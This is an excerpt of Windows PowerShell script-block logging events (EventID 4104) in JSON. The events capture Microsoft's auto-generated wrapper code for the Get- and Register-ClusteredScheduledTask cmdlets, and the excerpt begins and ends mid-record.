$true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskType')) {\r\n          [object]$__cmdletization_value = ${TaskType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Get', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-ClusteredScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Register-ClusteredScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=2, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=3)]\r\n    [Parameter(ParameterSetName='Params', Position=6)]\r\n    [Parameter(ParameterSetName='Xml', Position=3)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Cluster},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Params', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=1)]\r\n    [Parameter(ParameterSetName='Params', Position=1)]\r\n    [Parameter(ParameterSetName='Xml', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum]\r\n    ${TaskType},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=4)]\r\n    [Parameter(ParameterSetName='Params', Position=7)]\r\n    [Parameter(ParameterSetName='Xml', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Resource},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=4)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parame",
    "ScriptBlockId": "d312e26e-f2a9-4ba0-95bc-bdbc730b6055",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.436366Z"
    },
    "EventRecordID": 90,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-5C9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 2,
    "MessageTotal": 6,
    "ScriptBlockText": "ter(ParameterSetName='Params', Position=5)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='Params', Mandatory=$true, Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=2, ValueFromPipeline=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Xml},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskType')) {\r\n          [object]$__cmdletization_value = ${TaskType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Resource')) {\r\n          [object]$__cmdletization_value = ${Resource}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Params') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresen",
    "ScriptBlockId": "d312e26e-f2a9-4ba0-95bc-bdbc730b6055",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.436381Z"
    },
    "EventRecordID": 91,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-5C9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 3,
    "MessageTotal": 6,
    "ScriptBlockText": "t = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskType')) {\r\n          [object]$__cmdletization_value = ${TaskType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Resource')) {\r\n          [object]$__cmdletization_value = ${Resource}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByParams', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Xml') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Xml')) {\r\n          [object]$__cmdletization_value = ${Xml}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskType')) {\r\n          [object]$__cmdletization_value = ${TaskType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Resource')) {\r\n          [object]$__cmdletization_value = ${Resource}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.Po",
    "ScriptBlockId": "d312e26e-f2a9-4ba0-95bc-bdbc730b6055",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.436393Z"
    },
    "EventRecordID": 92,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-5C9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 4,
    "MessageTotal": 6,
